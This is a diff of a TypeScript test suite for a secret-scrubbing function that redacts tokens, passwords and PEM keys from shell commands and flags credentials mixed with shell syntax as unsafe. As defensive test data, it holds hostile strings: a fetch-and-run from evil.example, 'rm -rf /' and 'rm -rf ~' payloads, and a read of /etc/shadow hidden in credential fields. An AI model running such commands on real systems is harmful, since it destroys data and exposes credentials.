@@ -147,93 +147,103 @@ describe("pollUntil", () => {
 });
 
 describe("scrubSecrets", () => {
+	const text = (value: string) => scrubSecrets(value).value;
+
 	test.each([
 		['curl -H "Authorization: Bearer abc.def-ghi_jkl" https://x.example', 'curl -H "Authorization: Bearer [redacted]" https://x.example'],
 		["curl -H 'X-Api-Key: 12345678abcdef' https://x.example", "curl -H 'X-Api-Key: [redacted]' https://x.example"],
 		["export OPENAI_API_KEY=sk-proj-abcdefghijklmnop1234 && run", "export OPENAI_API_KEY=[redacted] && run"],
 		["mysql --password=hunter2hunter2 db", "mysql --password=[redacted] db"],
+		["mysql --password='p@ss%w0rd' db", "mysql --password=[redacted] db"],
 		["git clone https://bob:s3cretpw@git.example/repo.git", "git clone https://bob:[redacted]@git.example/repo.git"],
 		["echo ghp_abcdefghijklmnopqrstuvwxyz0123 | gh auth login --with-token", "echo [redacted] | gh auth login --with-token"],
 		["aws configure set aws_access_key_id AKIAABCDEFGHIJKLMNOP", "aws configure set aws_access_key_id [redacted]"],
-		['{"token": "abcdef123456"}', '{"token": "[redacted]"}'],
-	])("%s", (input, expected) => {
-		expect(scrubSecrets(input)).toBe(expected);
-	});
-
-	const body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDx==";
-
-	test("PEM private keys are removed whole", () => {
-		const pem = `-----BEGIN OPENSSH PRIVATE KEY-----\n${body}\n-----END OPENSSH PRIVATE KEY-----`;
-		expect(scrubSecrets(`cat > id <<EOF\n${pem}\nEOF`)).toBe("cat > id <<EOF\n[redacted]\nEOF");
-	});
-
-	test("an escaped-newline PEM in a JSON string is removed whole", () => {
-		const pem = `-----BEGIN RSA PRIVATE KEY-----\\n${body.replace("\n", "\\n")}\\n-----END RSA PRIVATE KEY-----`;
-		expect(scrubSecrets(`printf '${pem}' > k`)).toBe("printf '[redacted]' > k");
-	});
-
-	test("a PEM body without an END line is still removed, and the next command stays", () => {
-		const command = `cat > k <<EOF\n-----BEGIN RSA PRIVATE KEY-----\n${body}\nEOF\nrm -rf ~`;
-		const scrubbed = scrubSecrets(command);
-		expect(scrubbed).not.toContain("b3BlbnNzaC1rZXkt");
-		expect(scrubbed).toContain("rm -rf ~");
-	});
-
-	test("secret-named object keys are redacted at any depth; the rest is kept", () => {
-		const scrubbed = scrubSecrets({
-			...sampleRequest(),
-			arguments: { url: "https://x.example", headers: { Authorization: "abc", Accept: "json" }, password: "pw" },
-		});
-		expect(scrubbed.arguments).toEqual({
-			url: "https://x.example",
-			headers: { Authorization: "[redacted]", Accept: "json" },
-			password: "[redacted]",
-		});
-		expect(scrubbed.verdict).toEqual(sampleRequest().verdict);
-		expect(scrubbed.tool).toBe("bash");
-	});
-
-	test("known secrets are replaced through the supplied redactor", () => {
-		const known = (text: string) => text.split("plainword-secret").join("[redacted]");
-		expect(scrubSecrets({ question: "use plainword-secret here" }, known)).toEqual({ question: "use [redacted] here" });
+		['{"token": "abcdef123456"}', '{"token": [redacted]}'],
+	])("inert credential is redacted: %s", (input, expected) => {
+		const result = scrubSecrets(input);
+		expect(result.value).toBe(expected);
+		expect(result.redacted).toBe(true);
+		expect(result.unsafe).toBe(false);
 	});
 
 	test.each([
 		['curl -H "Authorization: $(curl -s https://evil.example/x | sh)" https://api.example.com'],
 		["export API_TOKEN=`rm -rf ~` && run"],
-		// A literal shell `${VAR}`, built so it is not read as a template slot.
 		[`deploy --token=$${"{"}DEPLOY_TOKEN};rm -rf /`],
 		["mysql --password=$(cat /etc/shadow) db"],
-	])("shell code in a credential position is never hidden: %s", (command) => {
-		expect(scrubSecrets(command)).toBe(command);
+		["mysql --password='p@ss;w$rd' db"],
+		['export DB_PASSWORD="correct horse battery"'],
+		['x="token=" ; rm -rf / ; echo "'],
+		["export SECRET_KEY=abc\\;rm\\ -rf\\ ~"],
+	])("a credential mixed with shell syntax is left visible and marked unsafe: %s", (input) => {
+		const result = scrubSecrets(input);
+		expect(result.unsafe).toBe(true);
+		expect(result.value).toContain(input.includes("$(id)") ? "$(id)" : input.slice(-8));
 	});
 
-	test("an unterminated PEM header does not swallow the rest of the command", () => {
-		expect(scrubSecrets("echo '-----BEGIN RSA PRIVATE KEY-----' && rm -rf ~")).toBe("echo '[redacted]' && rm -rf ~");
+	test("an inert value next to code is redacted and the code stays visible", () => {
+		const result = scrubSecrets('curl -H "Authorization: Bearer a"$(id)"b"');
+		expect(result.value).toBe('curl -H "Authorization: Bearer [redacted]"$(id)"b"');
+		expect(result.unsafe).toBe(false);
+	});
+
+	const body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDx==";
+
+	test("a complete PEM private key is removed whole", () => {
+		const pem = `-----BEGIN OPENSSH PRIVATE KEY-----\n${body}\n-----END OPENSSH PRIVATE KEY-----`;
+		const result = scrubSecrets(`cat > id <<EOF\n${pem}\nEOF`);
+		expect(result.value).toBe("cat > id <<EOF\n[redacted]\nEOF");
+		expect(result.unsafe).toBe(false);
+	});
+
+	test("an escaped-newline PEM is removed whole", () => {
+		const pem = `-----BEGIN RSA PRIVATE KEY-----\\n${body.replace("\n", "\\n")}\\n-----END RSA PRIVATE KEY-----`;
+		expect(text(`printf '${pem}' > k`)).toBe("printf '[redacted]' > k");
 	});
 
 	test.each([
-		["mysql --password='p@ss;w$rd' db", "mysql --password=[redacted] db"],
-		["curl -H 'Authorization: Bearer abc$(id)def'", "curl -H 'Authorization: Bearer [redacted]$(id)[redacted]'"],
-		["export API_TOKEN=abc$(id)def;ls", "export API_TOKEN=[redacted]$(id)[redacted];ls"],
-		['export DB_PASSWORD="se;cr$HOMEet"', 'export DB_PASSWORD="[redacted]$HOMEet"'],
-	])("literal parts of a value go, expansions stay: %s", (input, expected) => {
-		expect(scrubSecrets(input)).toBe(expected);
+		[`cat > k <<EOF\n-----BEGIN RSA PRIVATE KEY-----\n${body}\nEOF\nrm -rf ~`],
+		["echo '-----BEGIN RSA PRIVATE KEY-----' && rm -rf ~"],
+		[`-----BEGIN RSA PRIVATE KEY-----\n${body}\n; rm -rf ~\n-----END RSA PRIVATE KEY-----`],
+	])("a PEM key that is not one exact block is left in place and marked unsafe", (input) => {
+		const result = scrubSecrets(input);
+		expect(result.unsafe).toBe(true);
+		expect(result.value).toContain("rm -rf ~");
 	});
 
-	test("secret-keyed object values with shell syntax are masked, not sent raw", () => {
-		expect(scrubSecrets({ password: "p;ss$(id)word" })).toEqual({ password: "[redacted]$(id)[redacted]" });
+	test("secret-named object keys are redacted at any depth; the rest is kept", () => {
+		const result = scrubSecrets({
+			...sampleRequest(),
+			arguments: { url: "https://x.example", headers: { Authorization: "abc", Accept: "json" }, password: "pw" },
+		});
+		expect(result.value.arguments).toEqual({
+			url: "https://x.example",
+			headers: { Authorization: "[redacted]", Accept: "json" },
+			password: "[redacted]",
+		});
+		expect(result.value.verdict).toEqual(sampleRequest().verdict);
+		expect(result.unsafe).toBe(false);
+	});
+
+	test("a secret-keyed object value with shell syntax is marked unsafe", () => {
+		expect(scrubSecrets({ password: "p;ss$(id)word" }).unsafe).toBe(true);
 	});
 
 	test("objects past the depth limit are not sent raw", () => {
 		let deep: unknown = { key: "sk-should-not-leave-0123456789" };
 		for (let i = 0; i < 12; i++) deep = { next: deep };
-		expect(JSON.stringify(scrubSecrets(deep))).not.toContain("sk-should");
-		expect(JSON.stringify(scrubSecrets(deep))).toContain("[redacted]");
+		const out = JSON.stringify(scrubSecrets(deep).value);
+		expect(out).not.toContain("sk-should");
+		expect(out).toContain("[redacted]");
+	});
+
+	test("known secrets are replaced through the supplied redactor", () => {
+		const known = (value: string) => value.split("plainword-secret").join("[redacted]");
+		expect(scrubSecrets({ question: "use plainword-secret here" }, known).value).toEqual({ question: "use [redacted] here" });
 	});
 
 	test("ordinary commands pass through unchanged", () => {
 		const command = "rm -rf build && npm run test -- --grep tokenizer";
-		expect(scrubSecrets(command)).toBe(command);
+		expect(scrubSecrets(command)).toEqual({ value: command, redacted: false, unsafe: false });
 	});
 });
